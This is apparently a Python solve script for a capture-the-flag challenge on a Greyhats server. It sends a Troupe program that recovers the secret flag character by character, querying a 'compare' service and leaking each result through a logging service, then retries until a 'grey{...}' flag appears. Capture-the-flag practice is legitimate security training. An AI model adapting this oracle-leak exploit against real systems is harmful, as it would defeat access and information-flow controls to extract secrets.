import argparse
import re
import socket
import sys
import time


DEFAULT_HOST = "challs.nusgreyhats.org"
DEFAULT_PORT = 36167
PROMPT = b">> "
RETRYABLE_MESSAGES = (
    "[BUSY]",
    "[ERROR]",
    "[TIMEOUT]",
    "Transmission queue is full",
    "Transmission queue timed out",
    "Terminal capacity reached",
)

retriever_code = b'send(analysisService,("analyze",self()));let val r=receive val a=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","{","}","_","!","@","-"]val l=r[hn(_,n)=>n]fun e i=if i>=l then""else let fun b a=case a of[]=>"?"|c::t=>send(analysisService,("compare",self(),i,c));if r[hn(_,m)=>send(logService,("log",self(),m));r[hn(_,s)=>s]]then c else b t in b a^(e(i+1))end in e 0 end\nEOF\n'

"""Equivalent friendly Troupe source:

send(analysisService, ("analyze", self()));
let
    val charset = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o",
            "p","q","r","s","t","u","v","w","x","y","z","0","1","2","3",
            "4","5","6","7","8","9","A","B","C","D","E","F","G","H","I",
            "J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X",
            "Y","Z","{","}","_","!","@","-"]
    val len = receive [ hn ("analysis", n) => n ]
    fun extractChar idx =
        if idx >= len then ""
        else
            let
                fun tryChar chars =
                    case chars of
                        [] => "?"
                        | c :: rest =>
                            send(analysisService, ("compare", self(), idx, c));
                            let
                                val matched = receive [
                                    hn ("comparison", result) =>
                                        send(logService, ("log", self(), result));
                                        receive[
                                            hn ("logged", sanitized) => sanitized
                                        ]
                                ]
                            in
                                if matched then c
                                else tryChar rest
                            end
            in
                (tryChar charset) ^ (extractChar (idx + 1))
            end
in
    extractChar 0
end
EOF
"""


def recv_until(sock, marker, timeout, log=False):
    sock.settimeout(timeout)
    data = bytearray()
    deadline = time.monotonic() + timeout

    while marker not in data:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            raise TimeoutError(f"timed out waiting for {marker!r}")
        sock.settimeout(remaining)
        chunk = sock.recv(4096)
        if not chunk:
            break
        data.extend(chunk)
        if log:
            sys.stderr.write(chunk.decode("utf-8", errors="replace"))
            sys.stderr.flush()

    return bytes(data)


def recv_result(sock, timeout, log=False):
    sock.settimeout(timeout)
    data = bytearray()
    deadline = time.monotonic() + timeout

    while True:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            raise TimeoutError("timed out waiting for teletype output")
        sock.settimeout(remaining)
        chunk = sock.recv(4096)
        if not chunk:
            break
        data.extend(chunk)
        if log:
            sys.stderr.write(chunk.decode("utf-8", errors="replace"))
            sys.stderr.flush()

        text = data.decode("utf-8", errors="replace")
        if "grey{" in text:
            return bytes(data)
        if "AVAILABLE SERVICES" in text and text.rstrip().endswith(">>"):
            return bytes(data)

    return bytes(data)


def extract_flag(output):
    match = re.search(r"grey\{[^}\s]*\}", output)
    return match.group(0) if match else None


def run_once(host, port, timeout, log=False):
    with socket.create_connection((host, port), timeout=timeout) as sock:
        banner = recv_until(sock, PROMPT, timeout, log=log)
        if PROMPT not in banner:
            text = banner.decode("utf-8", errors="replace")
            return extract_flag(text), text

        sock.sendall(b"4\n")
        transmission_prompt = recv_until(sock, PROMPT, timeout, log=log)
        if PROMPT not in transmission_prompt:
            text = transmission_prompt.decode("utf-8", errors="replace")
            return extract_flag(text), text

        sock.sendall(retriever_code)
        result = recv_result(sock, timeout, log=log)

    text = result.decode("utf-8", errors="replace")
    return extract_flag(text), text


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?", default=DEFAULT_HOST)
    parser.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT)
    parser.add_argument("--retries", type=int, default=60)
    parser.add_argument("--retry-delay", type=float, default=3)
    parser.add_argument("--timeout", type=float, default=150)
    parser.add_argument("--log", action="store_true")
    return parser.parse_args()


def main():
    args = parse_args()
    last_output = ""

    for attempt in range(1, args.retries + 1):
        try:
            flag, output = run_once(args.host, args.port, args.timeout, log=args.log)
            last_output = output
            if flag:
                print(flag)
                return 0

            if any(message in output for message in RETRYABLE_MESSAGES):
                print(f"[attempt {attempt}] retryable remote response", flush=True)
            else:
                print(f"[attempt {attempt}] no flag found", flush=True)
                break
        except (OSError, TimeoutError) as e:
            print(f"[attempt {attempt}] {e}", file=sys.stderr, flush=True)

        if attempt != args.retries:
            time.sleep(args.retry_delay)

    if last_output:
        print(last_output)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
